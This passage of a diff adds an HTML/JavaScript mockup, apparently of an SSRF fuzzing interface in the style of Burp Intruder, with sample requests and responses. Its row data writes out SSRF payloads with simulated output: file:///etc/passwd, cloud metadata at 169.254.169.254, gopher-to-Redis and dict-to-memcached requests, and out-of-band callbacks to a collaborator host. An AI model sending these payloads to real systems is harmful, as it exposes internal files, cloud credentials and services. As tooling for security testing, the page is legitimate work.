+<span class="highlight-diff">+ node:x:1000:1000:NodeJS App:/home/node:/bin/bash</span></div>
+          </div>
+        </div>
+
+        <div class="inspector-body" id="collabPane" style="display: none;">
+          <div class="inspector-viewer-pane">
+            <div class="viewer-header">
+              <span>Burp Collaborator Interaction Events</span>
+              <span style="color: var(--accent-blue); font-weight: bold;">Subdomain: x7q9b02p4k1.burpcollaborator.net</span>
+            </div>
+            <div class="viewer-content" id="collabViewerContent">No interactions for this request. (Select Row 3, 4, or 7 to inspect collaborator callbacks)</div>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+
+  </div>
+
+  <script>
+    // Sample Data for table rows
+    const rowData = [
+      {
+        req: "POST /api/v1/import/url HTTP/1.1\nHost: target-app.internal.corp\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 62\nConnection: close\n\nurl=https://external.service.com/schema.json&format=json&sync=true",
+        resp: "HTTP/1.1 200 OK\nDate: Wed, 05 Nov 2026 12:20:00 GMT\nContent-Type: application/json\nContent-Length: 1420\nConnection: close\n\n{\n  \"status\": \"success\",\n  \"document_contents\": \"{\\\"$schema\\\": \\\"http://json-schema.org/draft-07/schema#\\\", \\\"title\\\": \\\"BaseSchema\\\"}\"\n}",
+        diff: "No differences from baseline.",
+        collab: "No interaction recorded."
+      },
+      {
+        req: "POST /api/v1/import/url HTTP/1.1\nHost: target-app.internal.corp\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\n\nurl=file:///etc/passwd&format=json&sync=true",
+        resp: "HTTP/1.1 200 OK\nDate: Wed, 05 Nov 2026 12:20:00 GMT\nContent-Type: application/json\nContent-Length: 2854\nConnection: close\n\n{\n  \"status\": \"success\",\n  \"document_contents\": \"root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nnode:x:1000:1000:NodeJS App:/home/node:/bin/bash\\n\"\n}",
+        diff: "+ root:x:0:0:root:/root:/bin/bash\n+ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n+ bin:x:2:2:bin:/bin:/usr/sbin/nologin\n+ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n+ node:x:1000:1000:NodeJS App:/home/node:/bin/bash",
+        collab: "No interaction recorded."
+      },
+      {
+        req: "POST /api/v1/import/url HTTP/1.1\nHost: target-app.internal.corp\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 69\nConnection: close\n\nurl=http://169.254.169.254/latest/meta-data/&format=json&sync=true",
+        resp: "HTTP/1.1 200 OK\nDate: Wed, 05 Nov 2026 12:20:01 GMT\nContent-Type: text/plain\nContent-Length: 1890\nConnection: close\n\nami-id\nami-launch-index\nami-manifest-path\nhostname\niam/\ninstance-action\ninstance-id\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nmetrics/\nnetwork/\nplacement/\nprofile\npublic-hostname\npublic-ipv4\nreservation-id\nsecurity-groups",
+        diff: "+ ami-id\n+ hostname\n+ iam/\n+ instance-id\n+ local-ipv4\n+ security-groups",
+        collab: "No interaction recorded."
+      },
+      {
+        req: "POST /api/v1/import/url HTTP/1.1\nHost: target-app.internal.corp\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 68\nConnection: close\n\nurl=smtp://x7q9b.burpcollaborator.net:25/&format=json&sync=true",
+        resp: "HTTP/1.1 504 Gateway Timeout\nDate: Wed, 05 Nov 2026 12:20:11 GMT\nContent-Type: application/json\nContent-Length: 520\nConnection: close\n\n{\n  \"error\": \"Gateway timeout while attempting to read from remote endpoint: Connection timed out\"\n}",
+        diff: "- 900 bytes delta (Gateway Timeout)",
+        collab: "Interaction Type: SMTP\nClient IP: 198.51.100.42 (Internal App Server)\nTimestamp: 2026-11-05 12:20:05 UTC\nHelo / Ehlo: target-app.internal.corp\nRaw SMTP Banner Sent: 220 Burp Collaborator Server Ready"
+      },
+      {
+        req: "POST /api/v1/import/url HTTP/1.1\nHost: target-app.internal.corp\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 76\nConnection: close\n\nurl=ldap://x7q9b.burpcollaborator.net:389/dc=ssrf&format=json&sync=true",
+        resp: "HTTP/1.1 502 Bad Gateway\nDate: Wed, 05 Nov 2026 12:20:02 GMT\nContent-Type: application/json\nContent-Length: 480\nConnection: close\n\n{\n  \"error\": \"Protocol parse exception: Unsupported URI scheme ldap\"\n}",
+        diff: "- 940 bytes delta",
+        collab: "Interaction Type: DNS\nQuery Name: x7q9b.burpcollaborator.net\nQuery Type: A\nClient IP: 198.51.100.1\nTimestamp: 2026-11-05 12:20:01 UTC\n\nInteraction Type: TCP/LDAP\nClient IP: 198.51.100.42\nPort: 389\nTimestamp: 2026-11-05 12:20:02 UTC"
+      },
+      {
+        req: "POST /api/v1/import/url HTTP/1.1\nHost: target-app.internal.corp\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 81\nConnection: close\n\nurl=gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a&format=json&sync=true",
+        resp: "HTTP/1.1 200 OK\nDate: Wed, 05 Nov 2026 12:20:03 GMT\nContent-Type: application/json\nContent-Length: 3410\nConnection: close\n\n{\n  \"status\": \"success\",\n  \"document_contents\": \"# Server\\nredis_version:6.2.6\\nredis_git_sha1:00000000\\nos:Linux 5.10.0-8-amd64 x86_64\\narch_bits:64\\ntcp_port:6379\\nuptime_in_seconds:384210\\nconnected_clients:1\\n\"\n}",
+        diff: "+ # Server\n+ redis_version:6.2.6\n+ tcp_port:6379\n+ connected_clients:1",
+        collab: "No interaction recorded."
+      },
+      {
+        req: "POST /api/v1/import/url HTTP/1.1\nHost: target-app.internal.corp\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 58\nConnection: close\n\nurl=dict://127.0.0.1:11211/stat&format=json&sync=true",
+        resp: "HTTP/1.1 200 OK\nDate: Wed, 05 Nov 2026 12:20:03 GMT\nContent-Type: application/json\nContent-Length: 2100\nConnection: close\n\n{\n  \"status\": \"success\",\n  \"document_contents\": \"STAT pid 14820\\nSTAT uptime 49202\\nSTAT time 1730800000\\nSTAT version 1.6.9\\nSTAT libevent 2.1.12-stable\\nSTAT curr_items 418\\nSTAT total_items 1240\\n\"\n}",
+        diff: "+ STAT pid 14820\n+ STAT version 1.6.9\n+ STAT curr_items 418",
+        collab: "No interaction recorded."
+      },
+      {
+        req: "POST /api/v1/import/url HTTP/1.1\nHost: target-app.internal.corp\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 72\nConnection: close\n\nurl=sftp://x7q9b.burpcollaborator.net:22/probe&format=json&sync=true",
+        resp: "HTTP/1.1 500 Internal Server Error\nDate: Wed, 05 Nov 2026 12:20:05 GMT\nContent-Type: application/json\nContent-Length: 512\nConnection: close\n\n{\n  \"error\": \"SFTP connection handshake failed\"\n}",
+        diff: "- 908 bytes delta",
+        collab: "Interaction Type: TCP\nClient IP: 198.51.100.42 (Internal App Server)\nDestination Port: 22\nTimestamp: 2026-11-05 12:20:04 UTC\nBanner: SSH-2.0-OpenSSH_8.4"
+      },
+      {
+        req: "POST /api/v1/import/url HTTP/1.1\nHost: target-app.internal.corp\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 71\nConnection: close\n\nurl=tftp://x7q9b.burpcollaborator.net:69/test&format=json&sync=true",
+        resp: "HTTP/1.1 500 Internal Server Error\nDate: Wed, 05 Nov 2026 12:20:07 GMT\nContent-Type: application/json\nContent-Length: 512\nConnection: close\n\n{\n  \"error\": \"TFTP timeout\"\n}",
+        diff: "- 908 bytes delta",
+        collab: "No interaction recorded."
+      }
+    ];
+
+    // Select row function
+    function selectRow(element, index) {
+      document.querySelectorAll('#resultsTable tbody tr').forEach(tr => tr.classList.remove('selected'));
+      element.classList.add('selected');
+
+      const data = rowData[index] || rowData[0];
+      document.getElementById('executedRequestContent').textContent = data.req;
+      document.getElementById('executedResponseContent').textContent = data.resp;
+      document.getElementById('diffViewerContent').textContent = data.diff;
+      document.getElementById('collabViewerContent').textContent = data.collab;
+
+      const cells = element.querySelectorAll('td');
+      document.getElementById('reqViewerInfo').textContent = "Payload: " + cells[3].textContent;
+    }
+
+    // Marker controls
+    function addMarker() {
+      const textarea = document.getElementById('rawRequestArea');
+      const start = textarea.selectionStart;
+      const end = textarea.selectionEnd;
+
+      if (start === end) {
+        alert("Please highlight/select the parameter value in the request editor where SSRF may be injected, then click 'Add Section Marker (§)'.");
+        return;
+      }
+
+      const text = textarea.value;
+      const selectedText = text.substring(start, end);
+      const replacement = `§${selectedText}§`;
+
+      textarea.value = text.substring(0, start) + replacement + text.substring(end);
+      textarea.setSelectionRange(start, start + replacement.length);
+      textarea.focus();
+      updateMarkerCount();
+    }
+
+    function clearMarkers() {
+      const textarea = document.getElementById('rawRequestArea');
+      textarea.value = textarea.value.replace(/§/g, '');
+      updateMarkerCount();
+    }
+
+    function autoDetectMarker() {
+      const textarea = document.getElementById('rawRequestArea');
+      let text = textarea.value.replace(/§/g, '');
+      const regex = /(url=)([^&\s]+)/i;
+      if (regex.test(text)) {
+        textarea.value = text.replace(regex, '$1§$2§');
+        updateMarkerCount();
+      } else {
+        alert("Could not automatically locate candidate URL/path parameter. Please highlight the value manually and click 'Add Section Marker (§)'.");
+      }
+    }
+
+    function updateMarkerCount() {
+      const text = document.getElementById('rawRequestArea').value;
+      const matches = text.match(/§[^§]*§/g);
+      const count = matches ? matches.length : 0;
+      document.getElementById('markerInfoLabel').textContent = count + " marker(s) defined: §...§";
+    }
+
+    // Tabs functionality
+    function switchSessionTab(tabId) {
+      document.querySelectorAll('.root-tab').forEach(tab => {
+        tab.classList.toggle('active', tab.getAttribute('data-tab-id') == tabId);
+      });
+      if (tabId === 1) {
+        document.getElementById('rawRequestArea').value = `POST /api/v1/import/url HTTP/1.1\nHost: target-app.internal.corp\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: application/json, text/plain, */*\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 62\nConnection: close\n\nurl=§https://external.service.com/schema.json§&format=json&sync=true`;
+      } else if (tabId === 2) {
+        document.getElementById('rawRequestArea').value = `GET /fetch_document?doc_url=§http://example.com/report.pdf§&inline=1 HTTP/1.1\nHost: target-app.internal.corp\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nConnection: close`;
+      } else if (tabId === 3) {
+        document.getElementById('rawRequestArea').value = `POST /webhook/receiver HTTP/1.1\nHost: target-app.internal.corp\nContent-Type: application/json\nConnection: close\n\n{\n  \"callback_url\": \"§http://10.0.0.1/notify§\",\n  \"event\": \"payment_success\"\n}`;
+      }
+      updateMarkerCount();
+    }
+
+    function closeSessionTab(tabId) {
+      const tab = document.querySelector(`.root-tab[data-tab-id="${tabId}"]`);
+      if (tab) {
+        tab.remove();
+        const remaining = document.querySelector('.root-tab');
+        if (remaining) {
+          switchSessionTab(remaining.getAttribute('data-tab-id'));
+        }
+      }
+    }
+
+    function addNewSessionTab() {
+      const bar = document.getElementById('rootTabsBar');
+      const newId = Date.now() % 1000;
+      const newTab = document.createElement('div');
+      newTab.className = 'root-tab';
+      newTab.setAttribute('data-tab-id', newId);
+      newTab.onclick = () => switchSessionTab(newId);
+      newTab.innerHTML = `<span>Session ${newId}</span><span class="tab-close" onclick="event.stopPropagation(); closeSessionTab(${newId})">x</span>`;
+      bar.insertBefore(newTab, bar.querySelector('.new-tab-btn'));
+      switchSessionTab(newId);
+    }
+
+    // Traffic Inspector Tabs
+    function switchInspectorTab(type) {
+      document.getElementById('tabReqResp').classList.toggle('active', type === 'reqresp');
+      document.getElementById('tabDiff').classList.toggle('active', type === 'diff');
+      document.getElementById('tabCollab').classList.toggle('active', type === 'collab');
+
+      document.getElementById('reqRespPane').style.display = type === 'reqresp' ? 'flex' : 'none';
+      document.getElementById('diffPane').style.display = type === 'diff' ? 'flex' : 'none';
+      document.getElementById('collabPane').style.display = type === 'collab' ? 'flex' : 'none';
+    }
+
+    // Attack simulator
+    let attackInterval = null;
+    let isAttacking = false;
+
+    function toggleAttack() {
+      const btn = document.getElementById('startAttackBtn');
+      if (!isAttacking) {
+        isAttacking = true;
+        btn.textContent = "Running...";
+        btn.disabled = true;
+        let progress = 58;
+        attackInterval = setInterval(() => {
+          if (progress < 100) {
+            progress += 5;
+            document.getElementById('progressBar').style.width = progress + '%';
+            document.getElementById('progressPercentText').textContent = progress + '%';
+            document.getElementById('progressStatusText').textContent = `Running: ${Math.round(progress * 0.72)} / 72 requests completed`;
+          } else {
+            clearInterval(attackInterval);
+            isAttacking = false;
+            btn.textContent = "Start Attack";
+            btn.disabled = false;
+            document.getElementById('progressStatusText').textContent = "Attack finished: 72 / 72 requests completed";
+          }
+        }, 400);
+      }
+    }
+
+    function pauseAttack() {
+      if (attackInterval) clearInterval(attackInterval);
+      isAttacking = false;
+      const btn = document.getElementById('startAttackBtn');
+      btn.textContent = "Resume Attack";
+      btn.disabled = false;
+      document.getElementById('progressStatusText').textContent = "Paused";
+    }
+
+    function stopAttack() {
+      if (attackInterval) clearInterval(attackInterval);
+      isAttacking = false;
+      const btn = document.getElementById('startAttackBtn');
+      btn.textContent = "Start Attack";
+      btn.disabled = false;
+      document.getElementById('progressBar').style.width = '0%';
+      document.getElementById('progressPercentText').textContent = '0%';
+      document.getElementById('progressStatusText').textContent = "Stopped (0 / 72 completed)";
+    }
+
+    // Table Filter
+    function filterTable() {
+      const query = document.getElementById('tableFilterInput').value.toLowerCase();
+      const rows = document.querySelectorAll('#resultsTable tbody tr');
+      rows.forEach(row => {
+        const text = row.innerText.toLowerCase();
+        row.style.display = text.includes(query) ? '' : 'none';
+      });
+    }
+
+    function setFilterCategory(element, category) {
+      document.querySelectorAll('.filter-pill').forEach(p => p.classList.remove('active'));
+      element.classList.add('active');
+
+      const rows = document.querySelectorAll('#resultsTable tbody tr');
+      rows.forEach(row => {
+        if (category === 'all') {
+          row.style.display = '';
+        } else {
+          row.style.display = row.getAttribute('data-category') === category ? '' : 'none';
+        }
+      });
+    }
+
+    function clearTable() {
+      document.querySelector('#resultsTable tbody').innerHTML = '<tr><td colspan="10" style="text-align:center; padding: 20px; color: var(--text-muted);">No execution results yet. Click "Start Attack" to begin.</td></tr>';
+      document.getElementById('executedRequestContent').textContent = '';
+      document.getElementById('executedResponseContent').textContent = '';
+      document.getElementById('diffViewerContent').textContent = '';
+      document.getElementById('collabViewerContent').textContent = '';
+    }
+
+    // Theme Toggle
+    function toggleTheme() {
+      const body = document.body;
+      const btn = document.getElementById('themeToggleBtn');
+      body.classList.toggle('light-theme');
+      if (body.classList.contains('light-theme')) {
+        btn.textContent = "Dark Theme";
+      } else {
+        btn.textContent = "Light Theme";
+      }
+    }
+
+    // Initialize
+    updateMarkerCount();
+  </script>
+</body>
+</html>
